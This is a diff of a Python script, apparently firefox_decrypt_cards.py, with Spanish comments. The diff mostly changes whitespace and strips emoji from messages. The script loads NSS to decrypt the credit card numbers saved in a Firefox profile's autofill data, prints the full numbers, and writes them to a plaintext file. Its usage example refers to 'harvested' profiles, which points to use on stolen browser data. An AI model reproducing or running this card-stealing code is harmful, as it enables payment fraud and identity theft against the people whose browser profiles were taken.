@@ -68,32 +68,32 @@ def decrypt_value(encrypted_b64: str, profile_path: str) -> str | None:
     try:
         # Decodificar Base64
         encrypted_data = base64.b64decode(encrypted_b64)
-        
+
         # Inicializar NSS con el perfil (CRÍTICO: debe hacerse aquí)
         if NSS_Init(profile_path.encode('utf-8')) != 0:
             raise Exception(f"NSS_Init failed for profile: {profile_path}")
-        
+
         # Crear SECItem para datos cifrados
         encrypted_item = SECItem()
         encrypted_item.data = cast(c_char_p(encrypted_data), c_void_p)
         encrypted_item.len = len(encrypted_data)
-        
+
         # Crear SECItem para resultado
         decrypted_item = SECItem()
-        
+
         # Descifrar
         if PK11SDR_Decrypt(byref(encrypted_item), byref(decrypted_item), None) != 0:
             NSS_Shutdown()
             raise Exception("PK11SDR_Decrypt failed")
-        
+
         # Extraer resultado
         decrypted_data = string_at(decrypted_item.data, decrypted_item.len)
-        
+
         # Limpiar
         NSS_Shutdown()
-        
+
         return decrypted_data.decode('utf-8', errors='ignore')
-    
+
     except Exception as e:
         print(f"      [!] Decrypt error: {e}")
         return None
@@ -104,70 +104,70 @@ def process_firefox_cards(profile_dir: str):
     Procesa tarjetas de crédito de un perfil de Firefox
     """
     profile_path = Path(profile_dir)
-    
+
     # Verificar archivos necesarios
     key4_db = profile_path / "key4.db"
     json_path = profile_path / "autofill-profiles.json"
-    
+
     if not key4_db.exists():
         print(f"[!] ERROR: key4.db not found in {profile_dir}")
         return
-    
+
     if not json_path.exists():
         print(f"[!] ERROR: autofill-profiles.json not found in {profile_dir}")
         return
-    
+
     print(f"\n{'='*60}")
     print(f"[+] Processing Firefox Credit Cards: {profile_path.name}")
     print(f"{'='*60}\n")
-    
+
     print(f"[*] Profile: {profile_path}")
     print(f"[*] NSS will be initialized per-card (like firefox_decrypt.py)\n")
-    
+
     # Leer JSON
     with open(json_path, 'r', encoding='utf-8') as f:
         data = json.load(f)
-    
+
     # Extraer tarjetas
     cards = data.get('creditCards', [])
-    
+
     if not cards:
         print("[!] No credit cards found in profile")
         NSS_Shutdown()
         return
-    
+
     print(f"[+] Found {len(cards)} credit card(s)\n")
-    
+
     # Procesar cada tarjeta
     decrypted_cards = []
-    
+
     for i, card in enumerate(cards, 1):
         print(f"[Card #{i}]")
-        
+
         name = card.get('cc-name', 'N/A')
         card_type = card.get('cc-type', 'N/A')
         exp_month = card.get('cc-exp-month', '?')
         exp_year = card.get('cc-exp-year', '?')
         masked_number = card.get('cc-number', '')
         encrypted_number = card.get('cc-number-encrypted', '')
-        
+
         print(f"  Name: {name}")
         print(f"  Type: {card_type}")
         print(f"  Expiration: {exp_month}/{exp_year}")
-        
+
         if masked_number:
             print(f"  Number (masked): {masked_number}")
-        
+
         # Intentar descifrar
         if encrypted_number:
             print(f"  Encrypted data: {encrypted_number[:40]}...")
             print(f"  [*] Attempting to decrypt...")
-            
+
             decrypted = decrypt_value(encrypted_number, str(profile_path))
-            
+
             if decrypted:
-                print(f"  ✅ SUCCESS! Card Number: {decrypted}")
-                
+                print(f"   SUCCESS! Card Number: {decrypted}")
+
                 decrypted_cards.append({
                     'name': name,
                     'type': card_type,
@@ -176,15 +176,15 @@ def process_firefox_cards(profile_dir: str):
                     'exp_year': exp_year,
                 })
             else:
-                print(f"  ❌ FAILED - Could not decrypt")
+                print(f"   FAILED - Could not decrypt")
                 print(f"     Possible reasons:")
                 print(f"     - Master Password is set")
                 print(f"     - Encryption format changed")
         else:
-            print(f"  ⚠️  No encrypted data found")
-        
+            print(f"    No encrypted data found")
+
         print()
-    
+
     # Guardar resultados
     if decrypted_cards:
         output_file = profile_path / "decrypted_credit_cards.txt"
@@ -192,14 +192,14 @@ def process_firefox_cards(profile_dir: str):
             f.write(f"Firefox Credit Cards - Decrypted\n")
             f.write(f"Profile: {profile_path.name}\n")
             f.write(f"{'='*60}\n\n")
-            
+
             for i, card in enumerate(decrypted_cards, 1):
                 f.write(f"[Card #{i}]\n")
                 f.write(f"  Name: {card['name']}\n")
                 f.write(f"  Type: {card['type']}\n")
                 f.write(f"  Number: {card['number']}\n")
                 f.write(f"  Expiration: {card['exp_month']}/{card['exp_year']}\n\n")
-        
+
         print(f"{'='*60}")
         print(f"[+] Successfully decrypted {len(decrypted_cards)} card(s)")
         print(f"[+] Results saved to: {output_file}")
@@ -215,13 +215,13 @@ def main():
         print("\nExample:")
         print("  python firefox_decrypt_cards.py harvested/firefox/foqs9fmi.default-release/")
         sys.exit(1)
-    
+
     profile_dir = sys.argv[1]
-    
+
     if not os.path.isdir(profile_dir):
         print(f"[!] ERROR: Directory not found: {profile_dir}")
         sys.exit(1)
-    
+
     process_firefox_cards(profile_dir)
 
 
